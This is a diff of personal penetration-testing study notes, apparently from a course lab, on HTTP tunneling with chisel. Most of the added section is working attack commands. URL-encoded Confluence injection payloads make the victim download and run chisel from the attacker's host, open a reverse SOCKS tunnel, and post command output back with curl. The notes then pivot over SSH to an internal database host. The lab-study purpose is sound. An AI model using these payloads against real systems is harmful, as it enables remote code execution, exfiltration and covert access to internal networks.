@@ -1644,16 +1644,48 @@ Reference
 - HTTP Tunneling
   - Deep Packet Inspection (DPI) terminating all outbound traffic except HTTP  
   - all inbound ports on CONFLUENCE01 are blocked except TCP/8090  
-  - no reverse shell, no port forward/ Only wget or curl  
+  - no reverse shell, no port forward/ Only wget or curl
+  - no ssh, ncat/socat on victim
   - [chisel](https://github.com/jpillora/chisel/releases), an HTTP tunneling tool that encapsulates our data stream within HTTP. client/server model. check architecture
-  - copy chisel binary to Apache2 server folder
+  - copy chisel binary to Apache2 server folder  
     `sudo cp $(which chisel) /var/www/html/`
-  - Starting Apache2 `sudo systemctl start apache2`
-  - download the Chisel binary to /tmp/chisel on CONFLUENCE01 and +x
+  - Starting Apache2 `sudo systemctl start apache2`  
+  - download the Chisel binary to /tmp/chisel on CONFLUENCE01 and +x  
     `wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel`
-  - format this to curlswqa-/-
-    ``
-  - ddd
+  - execute the wget confluence payload via curl  
+    `kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/`
+  - view the apache log file > "GET /chisel HTTP/1.1  
+    `kali@kali:~$ tail -f /var/log/apache2/access.log`
+  - start the chisel server on port 8080  
+    `kali@kali:~$ chisel server --port 8080 --reverse`
+  - Starting tcpdump to listen on TCP/8080 through the tun0 interface  
+    `kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080`
+  - web shell run chisel client from kali  
+    `kali@kali:~$ /tmp/chisel client <kali-ip>:8080 R:socks > /dev/null 2>&1 &`
+  - execute the wget confluence payload via curl > ntg happen  
+    `curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/`
+  - read the command output  
+    `/tmp/chisel client <kali-ip>:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/`
+  - The error-collecting-and-sending injection payload >  check Tcpdump output > " /tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found "  
+    `kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20<kali-ip>:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/`
+  - check chisel version in kali > 1.8.1-0kali2 (go1.20.7)  
+    `kali@kali:~$ chisel -h`
+  - Downloading Chisel 1.8.1 from the main Chisel repo, and copying it to the Apache web root directory  
+    `wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz`
+  - The Wget payload executed within our cURL Confluence injection command, again.  
+    `kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20<kali-ip>/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/`
+  - Trying to start the Chisel client using the Confluence injection payload, again  
+    `kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20<kali-ip>:8080%20R:socks%27%29.start%28%29%22%29%7D/`
+  - Inbound Chisel traffic logged by our tcpdump session  
+    `kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080`
+  - Incoming connection logged by the Chisel server  
+    `kali@kali:~$ chisel server --port 8080 --reverse`
+  - Using ss to check if our SOCKS port has been opened by the Kali Chisel server >  127.0.0.1:1080  
+    `ss -ntplu`
+  - installing Ncat (alternative written by the maintainers of Nmap) with apt  
+    `sudo apt install ncat`
+  - successfull ssh through chisel HTTP tunnel  
+    `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215`
 - DNS Tunneling
 - 
 ### 21. The metassploit framework
